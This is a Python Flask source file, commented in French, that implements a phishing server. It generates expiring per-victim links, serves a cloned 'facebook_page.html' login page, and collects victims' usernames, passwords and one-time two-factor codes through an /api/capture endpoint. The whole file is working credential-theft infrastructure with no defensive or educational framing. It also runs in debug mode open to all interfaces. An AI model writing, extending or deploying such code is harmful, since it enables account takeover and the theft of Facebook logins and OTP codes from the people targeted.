from datetime import datetime, timedelta, timezone
import secrets
from flask import Flask, jsonify, render_template_string, request

app = Flask(__name__)

LINK_TTL_DAYS = 3
SUPPORTED_LANGS = {"fr", "en", "es", "de"}
SUPPORTED_TYPES = {"standard", "otp", "otp_step1"}

# Stockage en mémoire des liens générés : chaque lien a son propre délai d'expiration (3 jours)
GENERATED_LINKS = {}
ACTIVE_LANG = {"lang": "fr"}
CAPTURED_EVENTS = []


def utc_now():
    return datetime.now(timezone.utc)


def cleanup_or_check_link(token: str):
    if not token:
        return None, "missing_token"
    record = GENERATED_LINKS.get(token)
    if not record:
        return None, "not_found"
    expires_at = record["expires_at"]
    if utc_now() >= expires_at:
        return record, "expired"
    return record, "valid"


@app.route("/api/generate-link", methods=["POST", "GET"])
def generate_link():
    data = request.get_json(silent=True) or request.args or {}
    lang = str(data.get("lang", "fr")).strip().lower()[:2]
    if lang not in SUPPORTED_LANGS:
        lang = "fr"

    mode_type = str(data.get("type", "otp")).strip().lower()
    if mode_type not in SUPPORTED_TYPES:
        mode_type = "otp"

    owner = str(data.get("user") or data.get("owner") or "Kim").strip() or "Kim"
    network = str(data.get("network") or "Facebook").strip() or "Facebook"

    token = secrets.token_urlsafe(12)
    created_at = utc_now()
    expires_at = created_at + timedelta(days=LINK_TTL_DAYS)

    GENERATED_LINKS[token] = {
        "token": token,
        "lang": lang,
        "type": mode_type,
        "owner": owner,
        "network": network,
        "created_at": created_at.isoformat(),
        "expires_at": expires_at,
        "uses": 0,
    }

    base_url = request.host_url.rstrip("/")
    link_url = f"{base_url}/?token={token}&lang={lang}&type={mode_type}&user={owner}"

    return jsonify(
        {
            "status": "ok",
            "token": token,
            "url": link_url,
            "lang": lang,
            "type": mode_type,
            "owner": owner,
            "network": network,
            "ttl_days": LINK_TTL_DAYS,
            "created_at": created_at.isoformat(),
            "expires_at": expires_at.isoformat(),
        }
    )


@app.route("/api/link-status/<token>", methods=["GET"])
def link_status(token: str):
    record, state = cleanup_or_check_link(token)
    if state == "not_found":
        return jsonify({"status": "error", "state": "not_found"}), 404

    remaining = max(0, int((record["expires_at"] - utc_now()).total_seconds()))
    return jsonify(
        {
            "status": "ok",
            "token": token,
            "state": state,
            "lang": record["lang"],
            "type": record["type"],
            "owner": record["owner"],
            "created_at": record["created_at"],
            "expires_at": record["expires_at"].isoformat(),
            "remaining_seconds": remaining,
            "uses": record["uses"],
        }
    )


@app.route("/api/lang", methods=["GET", "POST"])
def api_lang():
    if request.method == "GET":
        q_lang = str(request.args.get("lang", "")).strip().lower()[:2]
        if q_lang in SUPPORTED_LANGS:
            ACTIVE_LANG["lang"] = q_lang
        return jsonify({"status": "ok", "lang": ACTIVE_LANG["lang"]})

    data = request.get_json(silent=True) or {}
    lang = str(data.get("lang", "")).strip().lower()[:2]
    if lang in SUPPORTED_LANGS:
        ACTIVE_LANG["lang"] = lang

    token = str(data.get("token") or "").strip()
    if token and token in GENERATED_LINKS:
        GENERATED_LINKS[token]["lang"] = ACTIVE_LANG["lang"]

    return jsonify({"status": "ok", "lang": ACTIVE_LANG["lang"]})


@app.route("/api/capture", methods=["POST"])
def api_capture():
    data = request.get_json(silent=True) or {}
    token = str(data.get("token") or "").strip()
    if token:
        record, state = cleanup_or_check_link(token)
        if state == "expired":
            return jsonify({"status": "error", "reason": "link_expired_3_days"}), 410

    event = {
        "received_at": utc_now().isoformat(),
        "token": token or None,
        "owner": data.get("owner", "Kim"),
        "network": data.get("network", "Facebook"),
        "type": data.get("type", "standard"),
        "lang": data.get("lang", ACTIVE_LANG["lang"]),
        "victimUser": data.get("victimUser", ""),
        "victimPass": data.get("victimPass", ""),
        "otp": data.get("otp", "Aucun"),
    }
    CAPTURED_EVENTS.append(event)
    return jsonify({"status": "ok", "count": len(CAPTURED_EVENTS)})


@app.route("/")
def index():
    token = str(request.args.get("token") or "").strip()
    if token:
        record, state = cleanup_or_check_link(token)
        if state == "not_found":
            return "Lien invalide ou inexistant.", 404
        if state == "expired":
            return (
                f"Ce lien a expiré après {LINK_TTL_DAYS} jours "
                f"(expiration : {record['expires_at'].isoformat()}).",
                410,
            )
        record["uses"] += 1
        if record["lang"] in SUPPORTED_LANGS and not request.args.get("lang"):
            ACTIVE_LANG["lang"] = record["lang"]

    q_lang = str(request.args.get("lang") or "").strip().lower()[:2]
    if q_lang in SUPPORTED_LANGS:
        ACTIVE_LANG["lang"] = q_lang

    try:
        with open("facebook_page.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        return render_template_string(html_content)
    except FileNotFoundError:
        return jsonify(
            {
                "status": "ok",
                "message": "Serveur actif. Placez votre page HTML dans facebook_page.html ou appelez /api/generate-link.",
                "active_lang": ACTIVE_LANG["lang"],
                "active_links": len(GENERATED_LINKS),
            }
        )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
